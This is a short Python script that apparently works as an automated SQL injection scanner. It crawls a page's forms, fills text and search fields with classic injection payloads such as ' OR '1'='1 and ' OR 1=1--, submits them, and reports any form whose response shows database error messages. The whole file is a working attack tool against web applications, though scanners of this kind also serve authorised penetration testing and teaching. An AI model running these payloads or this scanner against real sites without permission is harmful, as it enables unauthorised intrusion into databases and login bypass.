





import requests
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup

# Common SQL payloads
payloads = [
    "' OR '1'='1",
    '" OR "1"="1',
    "';--",
    '" OR ""="',
    "' OR 1=1--",
    "' OR '1'='1' --"
]

def find_forms(url):
    try:
        res = requests.get(url, timeout=10)
        soup = BeautifulSoup(res.text, "html.parser")
        return soup.find_all("form")
    except Exception:
        return []

def form_details(form):
    details = {}
    try:
        action = form.attrs.get("action", "").lower()
        method = form.attrs.get("method", "get").lower()
        inputs = []
        for input_tag in form.find_all("input"):
            name = input_tag.attrs.get("name")
            type_ = input_tag.attrs.get("type", "text")
            value = input_tag.attrs.get("value", "")
            inputs.append({"name": name, "type": type_, "value": value})
        details["action"] = action
        details["method"] = method
        details["inputs"] = inputs
    except Exception:
        pass
    return details

def is_vulnerable(response):
    errors = [
        "you have an error in your sql syntax;",
        "warning: mysql",
        "unclosed quotation mark after the character string",
        "quoted string not properly terminated",
        "sql syntax",
    ]
    for error in errors:
        if error.lower() in response.text.lower():
            return True
    return False

def test_sql_injection(url):
    print("[*] Testing for SQL Injection vulnerabilities...")
    forms = find_forms(url)
    vulnerable = False
    for form in forms:
        details = form_details(form)
        for payload in payloads:
            data = {}
            for input_field in details["inputs"]:
                if input_field["type"] == "text" or input_field["type"] == "search":
                    data[input_field["name"]] = payload
                else:
                    data[input_field["name"]] = input_field["value"]

            form_url = urljoin(url, details["action"])
            try:
                if details["method"] == "post":
                    res = requests.post(form_url, data=data, timeout=10)
                else:
                    res = requests.get(form_url, params=data, timeout=10)
            except requests.exceptions.RequestException:
                continue

            if is_vulnerable(res):
                print(f"[!] SQL Injection vulnerability found in form at: {form_url}")
                print(f"    Payload: {payload}")
                vulnerable = True
                break
    if not vulnerable:
        print("[+] No SQL Injection vulnerabilities found.")
